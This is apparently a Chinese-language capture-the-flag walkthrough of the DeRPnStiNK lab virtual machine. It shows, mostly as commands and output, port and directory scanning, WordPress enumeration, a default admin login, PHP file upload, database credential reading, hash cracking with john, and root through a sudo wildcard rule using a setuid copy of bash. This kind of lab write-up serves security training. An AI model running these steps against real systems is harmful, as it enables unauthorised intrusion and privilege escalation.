## port scan

```shell
# Nmap 7.94SVN scan initiated Sun Feb  9 22:57:00 2025 as: nmap -sT --min-rate=8899 -p- -oN nmap_result/port 192.168.56.147
Nmap scan report for 192.168.56.147 (192.168.56.147)
Host is up (0.026s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

```shell
# Nmap 7.94SVN scan initiated Sun Feb  9 22:57:47 2025 as: nmap -sT -sVC -O -p21,22,80 -oN nmap_result/detils 192.168.56.147
Nmap scan report for 192.168.56.147 (192.168.56.147)
Host is up (0.0010s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 12:4e:f8:6e:7b:6c:c6:d8:7c:d8:29:77:d1:0b:eb:72 (DSA)
|   2048 72:c5:1c:5f:81:7b:dd:1a:fb:2e:59:67:fe:a6:91:2f (RSA)
|   256 06:77:0f:4b:96:0a:3a:2c:3b:f0:8c:2b:57:b5:97:bc (ECDSA)
|_  256 28:e8:ed:7c:60:7f:19:6c:e3:24:79:31:ca:ab:5d:2d (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: DeRPnStiNK
| http-robots.txt: 2 disallowed entries 
|_/php/ /temporary/
|_http-server-header: Apache/2.4.7 (Ubuntu)
MAC Address: 08:00:27:1F:C3:09 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## web

查看页面源码，发现flag1

`curl http://192.168.56.147/`

```
flag1(52E37291AEDF6A46D7D0BB8A6312F4F9F1AA4975C248C3F0E008CBA09D6E9166)
```

目录扫描

```shell
dirb http://192.168.56.147              

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Feb 10 02:08:50 2025
URL_BASE: http://192.168.56.147/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.56.147/ ----                                                                                                                            
+ http://192.168.56.147/index.html (CODE:200|SIZE:1298)
==> DIRECTORY: http://192.168.56.147/javascript/
==> DIRECTORY: http://192.168.56.147/js/
==> DIRECTORY: http://192.168.56.147/php/                                                                                                                                
+ http://192.168.56.147/robots.txt (CODE:200|SIZE:53)
+ http://192.168.56.147/server-status (CODE:403|SIZE:294)
==> DIRECTORY: http://192.168.56.147/temporary/
==> DIRECTORY: http://192.168.56.147/weblog/                                                           
==> DIRECTORY: http://192.168.56.147/php/phpmyadmin/

---- Entering directory: http://192.168.56.147/temporary/ ----
+ http://192.168.56.147/temporary/index.html (CODE:200|SIZE:12)

---- Entering directory: http://192.168.56.147/weblog/ ----
+ http://192.168.56.147/weblog/index.php (CODE:200|SIZE:14912)
==> DIRECTORY: http://192.168.56.147/weblog/wp-admin/
==> DIRECTORY: http://192.168.56.147/weblog/wp-content/
==> DIRECTORY: http://192.168.56.147/weblog/wp-includes/
```

枚举wordpress

```
wpscan --url http://derpnstink.local/weblog/
```

```shell
[i] Plugin(s) Identified:

[+] slideshow-gallery
 | Location: http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/
 | Last Updated: 2024-09-25T13:06:00.000Z
 | [!] The version is out of date, the latest version is 1.8.4
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.4.6 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/readme.txt
```

![image-20250210151454634](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250210151454634.png)

该插件存在文件上传漏洞

`cmseek -u http://192.168.56.147/weblog/`

![](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250210151655835.png)

2个用户

```
unclestinky
admin
```

弱口令`admin:admin`进入后台

上传php文件即可

![image-20250210151830011](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250210151830011.png)

## 提权

查看`wp-config.php`

```
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'mysql');

/** MySQL hostname */
define('DB_HOST', 'localhost');
```

登录mysql

```mysql
mysql> select user_login,user_pass,flag2 from wp_users;
+-------------+------------------------------------+-------+
| user_login  | user_pass                          | flag2 |
+-------------+------------------------------------+-------+
| unclestinky | $P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41 |       |
| admin       | $P$BgnU3VLAv.RWd3rdrkfVIuQr6mFvpd/ |       |
+-------------+------------------------------------+-------+
```

爆破hash`$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41`

`john hash --wordlist=/usr/share/wordlists/rockyou.txt`

```
wedgie57
```

登录wordpress后台，拿到flag2

![image-20250210152544976](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250210152544976.png)

发现主机存在两个用户，进行密码喷洒

```sh
www-data@DeRPnStiNK:/home$ su - stinky
Password: wedgie57
stinky@DeRPnStiNK:~$
```

```sh
stinky@DeRPnStiNK:~$ ls -laR Desktop
Desktop:
total 12
drwxr-xr-x  2 stinky stinky 4096 Nov 13  2017 .
drwx------ 12 stinky stinky 4096 Feb 10 10:18 ..
-rwxr-xr-x  1 stinky stinky   72 Nov 12  2017 flag.txt
```

`flag3(07f62b021771d3cf67e2e1faf18769cc5e5c119ad7d4d1847a11e11d6d5a7ecb)`

```sh
stinky@DeRPnStiNK:~/ftp/files/network-logs$ cat derpissues.txt
12:06 mrderp: hey i cant login to wordpress anymore. Can you look into it?
12:07 stinky: yeah. did you need a password reset?
12:07 mrderp: I think i accidently deleted my account
12:07 mrderp: i just need to logon once to make a change
12:07 stinky: im gonna packet capture so we can figure out whats going on
12:07 mrderp: that seems a bit overkill, but wtv
12:08 stinky: commence the sniffer!!!!
12:08 mrderp: -_-
12:10 stinky: fine derp, i think i fixed it for you though. cany you try to login?
12:11 mrderp: awesome it works!
12:12 stinky: we really are the best sysadmins #team
12:13 mrderp: i guess we are...
12:15 mrderp: alright I made the changes, feel free to decomission my account
12:20 stinky: done! yay
```

```sh
stinky@DeRPnStiNK:~/Documents$ ls -la
total 4300
drwxr-xr-x  2 stinky stinky    4096 Nov 13  2017 .
drwx------ 12 stinky stinky    4096 Feb 10 10:18 ..
-rw-r--r--  1 root   root   4391468 Nov 13  2017 derpissues.pcap
```

存在一个流量包

![image-20250210153218688](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250210153218688.png)

`mrderp:derpderpderpderpderpderpderp`

切换mderp用户

```sh
stinky@DeRPnStiNK:~/Documents$ su - mrderp
Password: derpderpderpderpderpderpderp
mrderp@DeRPnStiNK:~$ sudo -l
[sudo] password for mrderp: derpderpderpderpderpderpderp

Matching Defaults entries for mrderp on DeRPnStiNK:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mrderp may run the following commands on DeRPnStiNK:
    (ALL) /home/mrderp/binaries/derpy*
```

新建`binaries`和`derpy.sh`

```shell
mrderp@DeRPnStiNK:~$ ls -la binaries
ls -la binaries
total 12
drwxrwxr-x  2 mrderp mrderp 4096 Feb 10 08:20 .
drwx------ 11 mrderp mrderp 4096 Feb 10 10:18 ..
-rwxrwxr-x  1 mrderp mrderp   54 Feb 10 08:21 derpy.sh
mrderp@DeRPnStiNK:~$ cat binaries/derpy.sh
cat binaries/derpy.sh
#!/bin/bash
cp /bin/bash /tmp/bash;chmod +s /tmp/bash
```

```sh
mrderp@DeRPnStiNK:/tmp$ ls
bash  linpeas.sh
mrderp@DeRPnStiNK:/tmp$ ./bash -p
bash-4.3# id
uid=1000(mrderp) gid=1000(mrderp) euid=0(root) egid=0(root) groups=0(root),1000(mrderp)
bash-4.3# whoami
root
```

```sh
bash-4.3# cat flag.txt
flag4(49dca65f362fee401292ed7ada96f96295eab1e589c52e4e66bf4aedda715fdd)

Congrats on rooting my first VulnOS!

Hit me up on twitter and let me know your thoughts!

@securekomodo
```

